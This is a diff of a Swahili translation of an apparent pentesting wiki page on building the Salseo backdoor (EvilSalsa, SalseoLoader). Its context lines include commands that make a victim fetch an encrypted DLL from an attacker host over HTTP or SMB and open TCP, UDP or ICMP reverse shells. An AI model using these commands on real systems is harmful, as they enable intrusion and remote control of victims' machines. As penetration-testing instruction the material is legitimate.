@@ -19,7 +19,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 Pakua msimbo wa chanzo kutoka github na uunde **EvilSalsa** na **SalseoLoader**. Utahitaji **Visual Studio** iliyosakinishwa ili kuunda msimbo huo.
 
-Uunde miradi hiyo kwa ajili ya usanifu wa sanduku la windows ambapo unakusudia kuitumia (Ikiwa Windows inasaidia x64 uunde kwa usanifu huo).
+Unda miradi hiyo kwa ajili ya usanifu wa sanduku la windows ambapo unakusudia kuyatumia (Ikiwa Windows inasaidia x64 uunde kwa usanifu huo).
 
 Unaweza **kuchagua usanifu** ndani ya Visual Studio katika **"Build" Tab** ya **kushoto "Platform Target".**
 
@@ -27,7 +27,7 @@ Unaweza **kuchagua usanifu** ndani ya Visual Studio katika **"Build" Tab** ya **
 
 ![](<../.gitbook/assets/image (839).png>)
 
-Kisha, jenga miradi yote miwili (Build -> Build Solution) (Ndani ya log zitajitokeza njia ya executable):
+Kisha, jenga miradi yote miwili (Build -> Build Solution) (Ndani ya logi zitaonekana njia ya executable):
 
 ![](<../.gitbook/assets/image (381).png>)
 
@@ -57,13 +57,13 @@ Kumbuka kuanzisha nc kama msikilizaji wa reverse shell na seva ya HTTP kutoa evi
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
-### **Kupata shell ya UDP reverse (kushusha dll iliyokodiwa kupitia SMB)**
+### **Kupata shell ya UDP reverse (kupakua dll iliyokodishwa kupitia SMB)**
 
-Kumbuka kuanzisha nc kama msikilizaji wa shell ya reverse, na seva ya SMB kutoa evilsalsa iliyokodiwa (impacket-smbserver).
+Kumbuka kuanzisha nc kama msikilizaji wa shell ya reverse, na seva ya SMB kutoa evilsalsa iliyokodishwa (impacket-smbserver).
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **Kupata ICMP reverse shell (dll iliyosimbwa tayari ndani ya mwathiriwa)**
+### **Kupata ICMP reverse shell (dll iliyosimbwa tayari ndani ya mwathirika)**
 
 **Wakati huu unahitaji chombo maalum kwenye mteja kupokea reverse shell. Pakua:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
@@ -78,7 +78,7 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
-#### Ndani ya mwathiriwa, hebu tuendeshe kitu cha salseo:
+#### Ndani ya mwathiriwa, hebu tuendeshe jambo la salseo:
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
@@ -96,7 +96,7 @@ Fungua mradi wa SalseoLoader ukitumia Visual Studio.
 
 ![](<../.gitbook/assets/image (881).png>)
 
-#### **Tafuta kifurushi cha DllExport (ukitumia kichupo cha Browse), na bonyeza Sakinisha (na kubali popup)**
+#### **Tafuta kifurushi cha DllExport (ukitumia kichupo cha Kagua), na bonyeza Sakinisha (na kubali popup)**
 
 ![](<../.gitbook/assets/image (100).png>)
 
@@ -114,11 +114,11 @@ Tu **toka** Visual Studio
 
 Kisha, nenda kwenye **folda ya SalseoLoader** yako na **tekeleza DllExport\_Configure.bat**
 
-Chagua **x64** (ikiwa unakusudia kuitumia ndani ya sanduku la x64, hiyo ilikuwa hali yangu), chagua **System.Runtime.InteropServices** (ndani ya **Namespace kwa DllExport**) na bonyeza **Tumia**
+Chagua **x64** (ikiwa unakusudia kuitumia ndani ya sanduku la x64, hiyo ilikuwa kesi yangu), chagua **System.Runtime.InteropServices** (ndani ya **Namespace kwa DllExport**) na bonyeza **Tumia**
 
 ![](<../.gitbook/assets/image (882).png>)
 
-### **Fungua mradi tena na Visual Studio**
+### **Fungua mradi tena na visual Studio**
 
 **\[DllExport]** haipaswi kuwa na alama ya kosa tena
 
